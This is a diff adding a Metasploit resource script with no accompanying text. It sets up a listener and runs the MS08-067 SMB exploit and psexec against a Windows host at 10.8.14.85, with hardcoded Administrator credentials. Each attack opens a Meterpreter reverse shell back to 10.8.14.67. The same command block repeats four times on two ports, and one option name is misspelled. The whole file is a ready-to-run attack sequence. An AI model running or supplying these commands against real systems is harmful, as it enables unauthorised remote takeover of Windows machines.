@@ -1,0 +1,100 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -j -z
+setg DisalePayloadHandler 1
+use exploit/windows/smb/ms08_067_netapi
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -z -j
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SMBUser Administrator
+set SMBPass asssafff
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -z -j
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -j -z
+setg DisalePayloadHandler 1
+use exploit/windows/smb/ms08_067_netapi
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -z -j
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SMBUser Administrator
+set SMBPass asssafff
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -z -j
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -j -z
+setg DisalePayloadHandler 1
+use exploit/windows/smb/ms08_067_netapi
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -z -j
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SMBUser Administrator
+set SMBPass asssafff
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 1337
+exploit -z -j
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.8.14.67
+set LPORT 7779
+exploit -j -z
+setg DisalePayloadHandler 1
+use exploit/windows/smb/ms08_067_netapi
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 7779
+exploit -z -j
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SMBUser Administrator
+set SMBPass asssafff
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 7779
+exploit -z -j
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.8.14.67
+set LPORT 7779
+exploit -j -z
+setg DisalePayloadHandler 1
+use exploit/windows/smb/ms08_067_netapi
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 7779
+exploit -z -j
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SMBUser Administrator
+set SMBPass asssafff
+set RHOST 10.8.14.85
+set LHOST 10.8.14.67
+set LPORT 7779
+exploit -z -j
